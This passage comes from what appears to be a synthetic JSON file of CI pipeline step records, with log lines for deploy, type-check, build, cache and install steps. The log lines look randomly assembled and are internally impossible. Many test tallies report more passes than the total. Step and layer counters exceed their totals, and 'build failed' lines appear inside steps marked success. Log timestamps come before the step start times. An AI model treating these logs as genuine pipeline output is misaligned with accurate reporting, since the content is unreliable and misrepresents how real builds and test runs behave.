          "Generating source maps...",
          "TLS handshake completed",
          "[12:45:52] INFO: Cache refreshed",
          "Connection established",
          "Connection established",
          "  PASS: unit/test_db_connect.spec.js",
          "Fetching from https://github.com/package.json",
          "\u2713 build completed",
          "Waiting...",
          "npm notice: created a lockfile",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:47:00.114698",
        "finished_at": "2025-11-25T12:47:05.489364",
        "log_lines": [
          "=== Step: deploy_production ===",
          "Completed.",
          "Building Docker image...",
          "Cache saved successfully",
          "WARNING: eslint has known vulnerabilities",
          "Compiling src/service.java...",
          "Optimizing 83 modules...",
          "[12:45:52] INFO: Cache refreshed",
          "TLS handshake completed",
          "Compiling src/index.js...",
          "FAILED: test_cache_hit",
          "Optimizing 31 modules...",
          "[12:45:52] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "[12:45:52] DEBUG: Memory usage: 936MB",
          "Cache miss for key-4264",
          "[12:45:52] WARN: Deprecated API usage",
          "Compiling components/index.js...",
          "Success!",
          "Image pulled successfully",
          "Platform: linux-x64",
          "[12:45:52] INFO: Request completed",
          "Loading...",
          "Transforming 923 files...",
          "yarn add: Done in 14.99s",
          "GET /api - 201 (15ms)",
          "Image pulled successfully",
          "pip: Downloading express-1.13.tar.gz",
          "Tests: 191 passed, 197 total",
          "Pulling image: alpine:18",
          "Installing eslint@3.12.0",
          "Ready.",
          "Test Suites: 9 passed, 40 total",
          "\u2713 All checks passed",
          "Generating source maps...",
          "WARNING: eslint has known vulnerabilities",
          "TLS handshake completed",
          "Tests: 172 passed, 187 total",
          "Building Docker image...",
          "Compiling lib/app.ts...",
          "[12:45:52] INFO: Cache refreshed",
          "Generating source maps...",
          "Uploading artifact 'coverage' (18 files)",
          "Step 14/15: Linting",
          "Waiting...",
          "Done.",
          "pip: Installing build dependencies...",
          "Tests: 180 passed, 69 total",
          "Pulling image: python:3.11",
          "Verifying...",
          "[12:45:52] DEBUG: Connection pool: 10 active",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "Bundling styles.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Checking out main branch",
          "Ran 38 tests in 60s",
          "FAILED: test_auth_login",
          "Cache hit for key-4914",
          "Ran 116 tests in 16s",
          "POST /upload - 202 (402ms)",
          "Success!",
          "Compiling src/service.java...",
          "Bundling main.js",
          "OK",
          "Fetching from https://docker.io/package.json",
          "Creating production build...",
          "Time: 30.328s",
          "Optimizing 16 modules...",
          "Using Node.js 15.15.3",
          "npm install: added 392 packages",
          "\u2717 build failed with exit code 80",
          "[12:45:52] INFO: Request completed",
          "  PASS: test_db_connect (239ms)",
          "\u2713 Task completed in 4717ms",
          "Artifact uploaded: build.tar.gz (25MB)",
          "Loading...",
          "Installing eslint@5.15.6",
          "Environment: staging",
          "\u2713 All checks passed",
          "npm notice: created a lockfile",
          "[12:45:52] INFO: Cache refreshed",
          "pip: Collecting jest",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache saved successfully",
          "[12:45:52] DEBUG: Query executed in 32ms",
          "Tests: 449 passed, 94 total",
          "Platform: linux-x64",
          "Building Docker image...",
          "Image pulled successfully",
          "\u2717 build failed with exit code 22",
          "Ready.",
          "Layer 1/13: COPY command",
          "[12:45:52] DEBUG: Connection pool: 10 active",
          "Bundling vendor.css",
          "Compiling components/handler.rs...",
          "Layer 2/8: RUN command",
          "[12:45:52] INFO: Connecting to database",
          "[12:45:52] INFO: Processing request",
          "Cache miss for key-7292",
          "Processing...",
          "Success!",
          "Generating source maps...",
          "Already up to date.",
          "  PASS: unit/test_db_connect.spec.js",
          "  PASS: e2e/test_cache_hit.spec.js",
          "pip: Installing build dependencies...",
          "WARNING: jest has known vulnerabilities",
          "\u2713 test completed",
          "Creating production build...",
          "Uploading artifact 'build' (42 files)",
          "Snapshots: 46 passed, 25 total",
          "Cache restored successfully (460MB)",
          "\u2713 Step 'test' succeeded",
          "Generating source maps...",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 19/22: Installing dependencies",
          "pip: Downloading prettier-1.13.tar.gz",
          "\u2713 All checks passed",
          "Using Node.js 18.19.0",
          "WARNING: webpack has known vulnerabilities",
          "Step 3/19: Deploying",
          "npm notice: created a lockfile",
          "[12:45:52] DEBUG: Query executed in 71ms",
          "Checking out master branch",
          "Installing jest@1.11.6",
          "Artifact uploaded: dist.zip (45MB)",
          "Ready.",
          "Ready.",
          "[12:45:52] INFO: Connecting to database",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "GET /api - 204 (80ms)",
          "Connection established",
          "Cache hit for key-2049",
          "Layer 1/14: COPY command",
          "[12:45:52] DEBUG: Initializing service",
          "Uploading artifact 'build' (3 files)",
          "Step 14/22: Installing dependencies",
          "Step 14/16: Installing dependencies",
          "Artifact uploaded: dist.zip (93MB)",
          "Verifying...",
          "Optimizing 52 modules...",
          "Done.",
          "[12:45:52] INFO: Request completed",
          "Environment: staging",
          "Exception: ValueError",
          "Waiting...",
          "Cache saved successfully",
          "Finished.",
          "Compiling src/service.java...",
          "Uploading artifact 'coverage' (47 files)",
          "OK",
          "Compiling lib/app.ts...",
          "Step 6/21: Installing dependencies",
          "Layer 2/14: COPY command",
          "Step 16/22: Linting",
          "[12:45:52] DEBUG: Connection pool: 12 active",
          "[12:45:52] DEBUG: Connection pool: 13 active",
          "pip install: Successfully installed eslint-4.2",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 9/25: Installing dependencies",
          "Test Suites: 34 passed, 45 total",
          "  PASS: test_db_connect (416ms)",
          "Fetching from https://amazonaws.com/package.json",
          "HEAD is now at c6229ae",
          "npm notice: package.json updated",
          "Checking out main branch",
          "Compiling lib/main.py...",
          "Uploading artifact 'dist' (14 files)",
          "npm notice: package.json updated",
          "Environment: development",
          "OK",
          "Creating production build...",
          "Artifact uploaded: build.tar.gz (16MB)",
          "Environment: production",
          "Compiling components/service.java...",
          "Done.",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Optimizing 36 modules...",
          "[12:45:52] INFO: Request completed",
          "[12:45:52] INFO: Request completed",
          "Uploading artifact 'dist' (11 files)",
          "Optimizing 70 modules...",
          "Step 5/22: Installing dependencies",
          "Generating source maps...",
          "Optimizing 46 modules...",
          "Step 17/25: Linting",
          "Generating source maps...",
          "Test Suites: 28 passed, 42 total",
          "Artifact downloaded: 15MB",
          "Cache saved successfully",
          "Cache hit for key-3199",
          "Minifying app.js",
          "\u2713 All checks passed",
          "pip install: Successfully installed express-4.12",
          "pip: Installing build dependencies...",
          "Cache hit for key-5887",
          "npm notice: created a lockfile",
          "Step 6/24: Building",
          "Pushing to registry...",
          "Step 2/23: Linting",
          "Ran 130 tests in 40s",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-25T12:47:05.489364",
        "finished_at": "2025-11-25T12:47:18.926029",
        "log_lines": [
          "=== Step: type_check ===",
          "Done.",
          "Step 14/16: Building",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: build.tar.gz (7MB)",
          "Bundling styles.css",
          "yarn add: Done in 13.62s",
          "Test Suites: 38 passed, 33 total",
          "Bundling runtime.js",
          "Done.",
          "Connection established",
          "Generating source maps...",
          "Cache restored successfully (259MB)",
          "Cache miss for key-5319",
          "Done.",
          "[12:45:52] WARN: Deprecated API usage",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting webpack",
          "Fetching submodules...",
          "Bundling styles.css",
          "POST /data - 200 (172ms)",
          "Done.",
          "[12:45:52] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Tests: 179 passed, 333 total",
          "Cache invalidated: dependencies",
          "Connection established",
          "Step 4/19: Linting",
          "Pushing to registry...",
          "Snapshots: 24 passed, 19 total",
          "Building Docker image...",
          "\u2713 validate completed",
          "NODE_ENV=test",
          "Transforming 248 files...",
          "Processing...",
          "Cache invalidated: node_modules",
          "Transforming 136 files...",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache hit for key-1108",
          "Pulling image: python:latest",
          "Already up to date.",
          "[12:45:52] WARN: Deprecated API usage",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "  PASS: test_user_create (168ms)",
          "Cache hit for key-8700",
          "\u2713 Step 'test' succeeded",
          "[12:45:52] WARN: Deprecated API usage",
          "Pushing to registry...",
          "GET /api - 204 (59ms)",
          "Coverage: 75% statements, 75% branches",
          "GET /status - 201 (64ms)",
          "[12:45:52] WARN: Deprecated API usage",
          "[12:45:52] WARN: Deprecated API usage",
          "Compiling lib/main.py...",
          "Cache saved successfully",
          "Switched to branch 'feature/task-934'",
          "Using Node.js 14.1.10",
          "Fetching submodules...",
          "\u2713 All checks passed",
          "Step 11/24: Running migrations",
          "pip: Installing build dependencies...",
          "Step 15/19: Deploying",
          "Image pulled successfully",
          "Artifact downloaded: 5MB",
          "[12:45:52] DEBUG: Memory usage: 1044MB",
          "Pulling image: alpine:latest",
          "Ran 142 tests in 44s",
          "Step 15/20: Deploying",
          "Artifact downloaded: 47MB",
          "Completed.",
          "Creating production build...",
          "Using Node.js 18.20.2",
          "WARNING: eslint has known vulnerabilities",
          "Connection established",
          "Step 4/15: Building",
          "TLS handshake completed",
          "  PASS: integration/test_user_create.spec.js",
          "Pushing to registry...",
          "Optimizing 12 modules...",
          "NODE_ENV=development",
          "Cache restored successfully (391MB)",
          "Compiling lib/utils.go...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /upload - 200 (147ms)",
          "[12:45:52] DEBUG: Connection pool: 10 active",
          "pip: Downloading react-2.2.tar.gz",
          "\u2713 test completed",
          "Pushing to registry...",
          "Completed.",
          "yarn add: Done in 16.97s",
          "Step 17/23: Testing",
          "Transforming 171 files...",
          "pip: Installing build dependencies...",
          "POST /data - 200 (424ms)",
          "WARNING: jest has known vulnerabilities",
          "Compiling components/app.ts...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 16/23: Linting",
          "\u2713 Step 'setup' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Building Docker image...",
          "Cache saved successfully",
          "TLS handshake completed",
          "Cache restored successfully (129MB)",
          "Bundling styles.js",
          "Compiling components/main.py...",
          "Cache invalidated: node_modules",
          "[12:45:52] DEBUG: Connection pool: 11 active",
          "Using Python 3.10",
          "HEAD is now at c5aa93c",
          "Artifact uploaded: dist.zip (64MB)",
          "pip install: Successfully installed webpack-1.3",
          "[12:45:52] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "\u2717 build failed with exit code 50",
          "GET /health - 200 (92ms)",
          "Artifact uploaded: build.tar.gz (27MB)",
          "npm notice: created a lockfile",
          "Processing...",
          "npm notice: created a lockfile",
          "Compiling src/main.py...",
          "Ready.",
          "pip: Installing build dependencies...",
          "Cache hit for key-9377",
          "Creating production build...",
          "pip: Collecting prettier",
          "Loading...",
          "Finished.",
          "pip install: Successfully installed webpack-5.7",
          "Artifact uploaded: dist.zip (64MB)",
          "Ran 49 tests in 14s",
          "Installing react@5.20.2",
          "[12:45:52] DEBUG: Loading configuration",
          "Already up to date.",
          "[12:45:52] INFO: Cache refreshed",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Generating source maps...",
          "Verifying...",
          "Cache saved successfully",
          "Cache invalidated: build",
          "Test Suites: 10 passed, 36 total",
          "Artifact uploaded: dist.zip (37MB)",
          "Verifying...",
          "Artifact downloaded: 44MB",
          "Ran 69 tests in 9s",
          "Image pulled successfully",
          "  PASS: test_db_connect (334ms)",
          "Ready.",
          "Ready.",
          "[12:45:52] DEBUG: Connection pool: 9 active",
          "Coverage: 92% statements, 72% branches",
          "OK",
          "Ready.",
          "Waiting...",
          "Artifact downloaded: 50MB",
          "Using Node.js 14.17.6",
          "Loading...",
          "[12:45:52] INFO: Request completed",
          "Step 14/25: Building",
          "Step 3/15: Testing",
          "Optimizing 34 modules...",
          "Artifact uploaded: dist.zip (28MB)",
          "Environment: test",
          "pip: Installing build dependencies...",
          "[12:45:52] INFO: Request completed",
          "Processing...",
          "Test Suites: 12 passed, 47 total",
          "Compiling utils/handler.rs...",
          "  PASS: test_cache_hit (33ms)",
          "Step 9/19: Building",
          "WARNING: lodash has known vulnerabilities",
          "Cache invalidated: node_modules",
          "pip install: Successfully installed axios-2.6",
          "[12:45:52] DEBUG: Loading configuration",
          "[12:45:52] INFO: Starting build process",
          "Using Node.js 14.18.9",
          "Image pulled successfully",
          "[12:45:52] DEBUG: Initializing service",
          "\u2713 deploy completed",
          "Compiling utils/index.js...",
          "\u2713 Task completed in 851ms",
          "Loading...",
          "  PASS: integration/test_api_health.spec.js",
          "Verifying...",
          "Connection established",
          "Fetching from https://npmjs.org/package.json",
          "Step 4/19: Linting",
          "[12:45:52] DEBUG: Loading configuration",
          "[12:45:52] INFO: Connecting to database",
          "pip: Collecting axios",
          "Time: 100.76s",
          "Fetching from https://registry.npmjs.org/package.json",
          "Step 3/17: Building",
          "Layer 10/14: COPY command",
          "Cache hit for key-8082",
          "Step 5/21: Running migrations",
          "Already up to date.",
          "Done.",
          "[12:45:52] WARN: Deprecated API usage",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (3MB)",
          "NODE_ENV=test",
          "Finished.",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:47:18.926029",
        "finished_at": "2025-11-25T12:47:59.236024",
        "log_lines": [
          "=== Step: build ===",
          "Uploading artifact 'build' (21 files)",
          "Snapshots: 17 passed, 11 total",
          "Creating production build...",
          "npm install: added 436 packages",
          "NODE_ENV=development",
          "Pulling image: python:18",
          "Connection established",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Switched to branch 'feature/task-515'",
          "Waiting...",
          "WARNING: lodash has known vulnerabilities",
          "TLS handshake completed",
          "[12:45:52] DEBUG: Loading configuration",
          "\u2713 All checks passed",
          "npm install: resolved 767 packages",
          "  PASS: unit/test_api_health.spec.js",
          "Building Docker image...",
          "Compiling lib/utils.go...",
          "Cache miss for key-3804",
          "WARNING: webpack has known vulnerabilities",
          "[12:45:52] WARN: Deprecated API usage",
          "[12:45:52] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Building Docker image...",
          "yarn add: Done in 13.76s",
          "[12:45:52] DEBUG: Connection pool: 18 active",
          "Snapshots: 13 passed, 16 total",
          "Completed.",
          "Tests: 481 passed, 282 total",
          "Fetching from https://gcr.io/package.json",
          "Switched to branch 'bugfix/task-931'",
          "[12:45:52] DEBUG: Loading configuration",
          "Fetching from https://npmjs.org/package.json",
          "pip: Installing build dependencies...",
          "npm notice: package.json updated",
          "Verifying...",
          "npm notice: created a lockfile",
          "Environment: production",
          "Snapshots: 45 passed, 3 total",
          "Cache hit for key-6469",
          "POST /api - 202 (276ms)",
          "GET /status - 201 (76ms)",
          "TLS handshake completed",
          "Compiling components/index.js...",
          "Using Python 3.12",
          "Cache miss for key-7973",
          "Step 12/23: Linting",
          "Uploading artifact 'build' (43 files)",
          "Fetching from https://docker.io/package.json",
          "Waiting...",
          "Step 9/23: Testing",
          "POST /upload - 200 (70ms)",
          "Compiling components/app.ts...",
          "npm install: added 131 packages",
          "Optimizing 78 modules...",
          "Already up to date.",
          "Snapshots: 41 passed, 11 total",
          "Optimizing 74 modules...",
          "Using Node.js 17.2.8",
          "Cache miss for key-8746",
          "Minifying vendor.js",
          "Ready.",
          "Snapshots: 5 passed, 30 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "OK",
          "[12:45:52] DEBUG: Memory usage: 1920MB",
          "Compiling src/index.js...",
          "Cache saved successfully",
          "npm notice: created a lockfile",
          "Done.",
          "Fetching submodules...",
          "Compiling utils/utils.go...",
          "Verifying...",
          "Building Docker image...",
          "Ran 37 tests in 35s",
          "[12:45:52] ERROR: Connection failed",
          "Cache saved successfully",
          "Compiling lib/service.java...",
          "Layer 10/15: RUN command",
          "Waiting...",
          "Minifying main.js",
          "Completed.",
          "Compiling lib/utils.go...",
          "Compiling utils/handler.rs...",
          "Building Docker image...",
          "Step 20/21: Building",
          "Cache invalidated: build",
          "Pushing to registry...",
          "Generating source maps...",
          "[12:45:52] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Fetching submodules...",
          "Step 16/17: Installing dependencies",
          "\u2713 All checks passed",
          "TLS handshake completed",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "npm notice: created a lockfile",
          "Test Suites: 35 passed, 7 total",
          "\u2713 validate completed",
          "Test Suites: 7 passed, 29 total",
          "\u2713 All checks passed",
          "Test Suites: 18 passed, 37 total",
          "\u2713 All checks passed",
          "Compiling utils/service.java...",
          "pip install: Successfully installed prettier-3.7",
          "Cache invalidated: dependencies",
          "Success!",
          "Cache hit for key-2732",
          "Connection established",
          "Ran 136 tests in 15s",
          "GET /health - 200 (80ms)",
          "Artifact downloaded: 40MB",
          "Tests: 301 passed, 144 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:45:52] INFO: Starting build process",
          "Layer 5/15: RUN command",
          "WARNING: react has known vulnerabilities",
          "npm install: added 343 packages",
          "Using Node.js 18.9.10",
          "Compiling utils/handler.rs...",
          "Completed.",
          "HEAD is now at e2637bf",
          "Optimizing 14 modules...",
          "Completed.",
          "npm install: added 399 packages",
          "[12:45:52] INFO: Starting build process",
          "Compiling components/main.py...",
          "npm install: added 254 packages",
          "Step 18/15: Running migrations",
          "Pushing to registry...",
          "Tests: 164 passed, 401 total",
          "Artifact downloaded: 33MB",
          "yarn add: Done in 11.11s",
          "Waiting...",
          "Cache saved successfully",
          "POST /data - 202 (49ms)",
          "WARNING: axios has known vulnerabilities",
          "pip: Downloading react-1.11.tar.gz",
          "npm notice: created a lockfile",
          "Checking out develop branch",
          "[12:45:52] INFO: Starting build process",
          "[12:45:52] DEBUG: Connection pool: 6 active",
          "\u2713 deploy completed",
          "npm install: resolved 1878 packages",
          "[12:45:52] DEBUG: Memory usage: 977MB",
          "Waiting...",
          "Snapshots: 4 passed, 17 total",
          "GET /health - 200 (7ms)",
          "Pulling image: node:18",
          "Finished.",
          "Uploading artifact 'dist' (28 files)",
          "Ran 46 tests in 27s",
          "\u2713 Task completed in 3641ms",
          "Compiling components/main.py...",
          "Bundling styles.js",
          "Environment: staging",
          "Ready.",
          "Waiting...",
          "Done.",
          "Exception: NullPointerException",
          "Transforming 412 files...",
          "Compiling lib/utils.go...",
          "Processing...",
          "Step 16/16: Installing dependencies",
          "Ready.",
          "Coverage: 82% statements, 92% branches",
          "Compiling src/service.java...",
          "Step 20/22: Building",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "Step 7/15: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "Cache hit for key-3735",
          "Transforming 280 files...",
          "Using Python 3.10",
          "Ready.",
          "WARNING: react has known vulnerabilities",
          "Processing...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Compiling lib/app.ts...",
          "\u2713 deploy completed",
          "[12:45:52] DEBUG: Query executed in 36ms",
          "Environment: test",
          "Step 2/25: Deploying",
          "Cache hit for key-9106",
          "Artifact downloaded: 7MB",
          "npm install: added 247 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 6/15: Running migrations",
          "Cache saved successfully",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Tests: 64 passed, 497 total",
          "Pushing to registry...",
          "[12:45:52] INFO: Request completed",
          "HEAD is now at 3b459f2",
          "WARNING: jest has known vulnerabilities",
          "Fetching submodules...",
          "Already up to date.",
          "Verifying...",
          "pip: Installing build dependencies...",
          "[12:45:52] DEBUG: Initializing service",
          "  PASS: test_user_create (231ms)",
          "\u2713 Task completed in 2765ms",
          "Connection established",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-25T12:47:59.236024",
        "finished_at": "2025-11-25T12:48:07.298023",
        "log_lines": [
          "=== Step: restore_cache ===",
          "\u2713 validate completed",
          "Waiting...",
          "Cache invalidated: node_modules",
          "POST /upload - 200 (235ms)",
          "WARNING: webpack has known vulnerabilities",
          "Generating source maps...",
          "[12:45:52] DEBUG: Memory usage: 1240MB",
          "FAILED: test_cache_hit",
          "[12:45:52] DEBUG: Memory usage: 1189MB",
          "[12:45:52] INFO: Connecting to database",
          "npm install: added 177 packages",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:52] INFO: Cache refreshed",
          "Tests: 466 passed, 222 total",
          "Artifact downloaded: 6MB",
          "HEAD is now at 64e90dc",
          "Exception: TypeError",
          "pip install: Successfully installed lodash-4.5",
          "Artifact uploaded: dist.zip (38MB)",
          "Artifact uploaded: build.tar.gz (2MB)",
          "[12:45:52] WARN: Deprecated API usage",
          "pip: Downloading react-2.16.tar.gz",
          "yarn add: Done in 7.61s",
          "[12:45:52] DEBUG: Connection pool: 12 active",
          "Finished.",
          "Done.",
          "Building Docker image...",
          "npm notice: created a lockfile",
          "Cache invalidated: node_modules",
          "Step 6/19: Deploying",
          "  PASS: test_cache_hit (118ms)",
          "Generating source maps...",
          "[12:45:53] INFO: Starting build process",
          "Cache invalidated: node_modules",
          "npm install: added 429 packages",
          "Artifact uploaded: build.tar.gz (29MB)",
          "Using Python 3.10",
          "Step 11/18: Building",
          "Ready.",
          "pip: Collecting prettier",
          "OK",
          "Test Suites: 38 passed, 49 total",
          "Connection established",
          "  PASS: test_api_health (128ms)",
          "[12:45:53] DEBUG: Initializing service",
          "Checking out develop branch",
          "[12:45:53] DEBUG: Initializing service",
          "[12:45:53] DEBUG: Query executed in 32ms",
          "Cache miss for key-5382",
          "[12:45:53] INFO: Processing request",
          "Snapshots: 2 passed, 11 total",
          "Layer 10/11: ENV command",
          "Finished.",
          "Step 3/18: Deploying",
          "Pushing to registry...",
          "[12:45:53] DEBUG: Initializing service",
          "Cache miss for key-7914",
          "[12:45:53] WARN: Deprecated API usage",
          "Step 8/16: Testing",
          "\u2713 Step 'checkout' succeeded",
          "Step 11/16: Deploying",
          "\u2717 build failed with exit code 90",
          "[12:45:53] INFO: Request completed",
          "HEAD is now at 8d818ef",
          "[12:45:53] INFO: Request completed",
          "npm notice: package.json updated",
          "Layer 8/13: ENV command",
          "Compiling utils/index.js...",
          "Step 11/15: Deploying",
          "Ready.",
          "TLS handshake completed",
          "Using Python 3.12",
          "Installing webpack@2.16.0",
          "Compiling src/utils.go...",
          "[12:45:53] ERROR: Connection failed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Minifying main.js",
          "[12:45:53] DEBUG: Initializing service",
          "pip: Downloading axios-1.17.tar.gz",
          "HEAD is now at c73bb7e",
          "  PASS: e2e/test_cache_hit.spec.js",
          "HEAD is now at ef7aefa",
          "Checking out develop branch",
          "Step 9/16: Testing",
          "Building Docker image...",
          "Step 20/22: Testing",
          "Transforming 123 files...",
          "NODE_ENV=production",
          "Fetching submodules...",
          "npm notice: package.json updated",
          "Compiling components/main.py...",
          "Step 13/22: Linting",
          "Step 14/24: Installing dependencies",
          "[12:45:53] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Platform: win32-x64",
          "pip: Collecting prettier",
          "[12:45:53] INFO: Cache refreshed",
          "pip: Installing build dependencies...",
          "pip: Downloading react-5.13.tar.gz",
          "Image pulled successfully",
          "npm install: added 453 packages",
          "Fetching from https://npmjs.org/package.json",
          "Coverage: 85% statements, 89% branches",
          "Cache hit for key-1052",
          "Artifact uploaded: dist.zip (18MB)",
          "npm notice: created a lockfile",
          "Snapshots: 10 passed, 18 total",
          "Cache hit for key-3253",
          "Artifact uploaded: dist.zip (40MB)",
          "Installing react@3.18.3",
          "Layer 10/9: ENV command",
          "Connection established",
          "pip: Collecting react",
          "Cache saved successfully",
          "[12:45:53] DEBUG: Memory usage: 805MB",
          "Environment: development",
          "Minifying main.js",
          "HEAD is now at 42659ca",
          "TLS handshake completed",
          "Loading...",
          "Ready.",
          "Transforming 276 files...",
          "Image pulled successfully",
          "TLS handshake completed",
          "Compiling src/service.java...",
          "\u2713 Task completed in 4638ms",
          "Step 8/21: Testing",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] DEBUG: Loading configuration",
          "Coverage: 88% statements, 85% branches",
          "Finished.",
          "Pulling image: alpine:latest",
          "Ready.",
          "Step 15/23: Testing",
          "[12:45:53] INFO: Processing request",
          "Artifact uploaded: dist.zip (92MB)",
          "[12:45:53] INFO: Connecting to database",
          "Loading...",
          "TLS handshake completed",
          "Time: 101.949s",
          "Environment: staging",
          "Step 10/20: Testing",
          "Optimizing 73 modules...",
          "WARNING: prettier has known vulnerabilities",
          "pip: Downloading jest-3.6.tar.gz",
          "GET /status - 204 (45ms)",
          "Pushing to registry...",
          "Done.",
          "Compiling components/utils.go...",
          "[12:45:53] DEBUG: Initializing service",
          "Using Node.js 18.19.6",
          "Tests: 50 passed, 472 total",
          "Step 2/15: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 package completed",
          "Step 19/21: Running migrations",
          "[12:45:53] INFO: Connecting to database",
          "[12:45:53] INFO: Processing request",
          "[12:45:53] WARN: Deprecated API usage",
          "Compiling utils/index.js...",
          "Processing...",
          "pip install: Successfully installed react-4.4",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_api_health (241ms)",
          "Artifact downloaded: 2MB",
          "[12:45:53] DEBUG: Memory usage: 971MB",
          "Layer 6/8: ENV command",
          "Creating production build...",
          "[12:45:53] DEBUG: Initializing service",
          "WARNING: jest has known vulnerabilities",
          "Already up to date.",
          "Finished.",
          "Creating production build...",
          "Already up to date.",
          "Cache hit for key-3086",
          "Ready.",
          "Artifact downloaded: 35MB",
          "\u2717 build failed with exit code 77",
          "[12:45:53] DEBUG: Connection pool: 16 active",
          "Compiling utils/index.js...",
          "Step 12/25: Running migrations",
          "Done.",
          "\u2713 Task completed in 3735ms",
          "Ran 182 tests in 23s",
          "npm notice: created a lockfile",
          "Artifact downloaded: 41MB",
          "Processing...",
          "OK",
          "\u2717 build failed with exit code 92",
          "Artifact downloaded: 10MB",
          "Coverage: 70% statements, 68% branches",
          "Fetching from https://npmjs.org/package.json",
          "Tests: 285 passed, 100 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Ready.",
          "Time: 56.72s",
          "Fetching submodules...",
          "Switched to branch 'bugfix/task-823'",
          "WARNING: eslint has known vulnerabilities",
          "[12:45:53] INFO: Processing request",
          "Compiling components/main.py...",
          "Ran 158 tests in 14s",
          "Loading...",
          "Done.",
          "npm install: resolved 626 packages",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-25T12:48:07.298023",
        "finished_at": "2025-11-25T12:48:47.608018",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Pulling image: python:3.11",
          "[12:45:53] INFO: Request completed",
          "\u2713 Task completed in 2094ms",
          "Building Docker image...",
          "yarn add: Done in 7.19s",
          "Exception: NullPointerException",
          "\u2713 deploy completed",
          "pip install: Successfully installed webpack-2.19",
          "yarn add: Done in 5.13s",
          "Compiling utils/utils.go...",
          "npm notice: package.json updated",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 14/25: Linting",
          "POST /upload - 200 (338ms)",
          "Environment: test",
          "Finished.",
          "Layer 4/12: ENV command",
          "Checking out main branch",
          "POST /api - 201 (177ms)",
          "[12:45:53] DEBUG: Loading configuration",
          "Installing express@2.10.1",
          "Generating source maps...",
          "Cache invalidated: build",
          "Bundling styles.js",
          "Using Node.js 17.4.7",
          "npm notice: created a lockfile",
          "Step 11/23: Linting",
          "Test Suites: 17 passed, 8 total",
          "TLS handshake completed",
          "Loading...",
          "Image pulled successfully",
          "Loading...",
          "Compiling src/index.js...",
          "Exception: TypeError",
          "Success!",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:45:53] DEBUG: Loading configuration",
          "\u2713 package completed",
          "Completed.",
          "[12:45:53] WARN: Deprecated API usage",
          "[12:45:53] DEBUG: Loading configuration",
          "Installing lodash@4.9.6",
          "Creating production build...",
          "Pushing to registry...",
          "Layer 5/13: COPY command",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:45:53] INFO: Processing request",
          "Finished.",
          "[12:45:53] DEBUG: Query executed in 1ms",
          "Switched to branch 'feature/task-465'",
          "Step 20/16: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 5/18: Linting",
          "Step 20/15: Linting",
          "Transforming 428 files...",
          "WARNING: express has known vulnerabilities",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Compiling lib/main.py...",
          "[12:45:53] INFO: Connecting to database",
          "  PASS: unit/test_cache_hit.spec.js",
          "Verifying...",
          "Installing webpack@2.9.8",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "Waiting...",
          "  PASS: integration/test_auth_login.spec.js",
          "Step 17/21: Installing dependencies",
          "POST /data - 202 (418ms)",
          "npm notice: package.json updated",
          "[12:45:53] DEBUG: Query executed in 58ms",
          "Exception: ValueError",
          "Compiling src/service.java...",
          "Compiling lib/index.js...",
          "Step 1/15: Building",
          "npm install: added 190 packages",
